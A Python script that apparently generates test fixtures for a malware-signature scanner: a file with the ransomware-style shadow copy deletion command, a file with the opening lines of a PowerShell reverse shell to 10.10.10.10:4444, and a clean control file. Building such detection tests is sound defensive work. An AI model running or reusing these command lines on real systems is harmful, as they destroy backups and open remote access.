import os

def create_payloads():
    # Target directory relative to this file
    data_dir = os.path.dirname(os.path.abspath(__file__))
    target_dir = os.path.join(data_dir, "test_payloads")
    os.makedirs(target_dir, exist_ok=True)
    
    # 1. Ransomware signature payload
    ransomware_path = os.path.join(target_dir, "ransomware_trigger.txt")
    with open(ransomware_path, "w", encoding="utf-8") as f:
        f.write("# Benign Ransomware Command Line Test Payload\n")
        f.write("echo 'Initiating shadow copy deletion test...'\n")
        f.write("vssadmin.exe delete shadows /all /quiet\n")
        
    # 2. Reverse Shell signature payload
    revshell_path = os.path.join(target_dir, "reverse_shell.ps1")
    with open(revshell_path, "w", encoding="utf-8") as f:
        f.write("# Benign Reverse Shell TCP Test Payload\n")
        f.write("$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10', 4444);\n")
        f.write("$stream = $client.GetStream();\n")
        f.write("[byte[]]$bytes = 0..65535|%{0};\n")
        
    # 3. Clean safe file
    safe_path = os.path.join(target_dir, "safe_file.txt")
    with open(safe_path, "w", encoding="utf-8") as f:
        f.write("Hello User! This is a completely clean text document containing standard research descriptions.\n")
        f.write("No malicious API calls or YARA patterns exist here.\n")
        
    print(f"[+] Benign test payloads generated successfully in:\n    {target_dir}")
    print(f"    - Ransomware Trigger: {ransomware_path}")
    print(f"    - Reverse Shell: {revshell_path}")
    print(f"    - Safe File: {safe_path}")

if __name__ == "__main__":
    create_payloads()
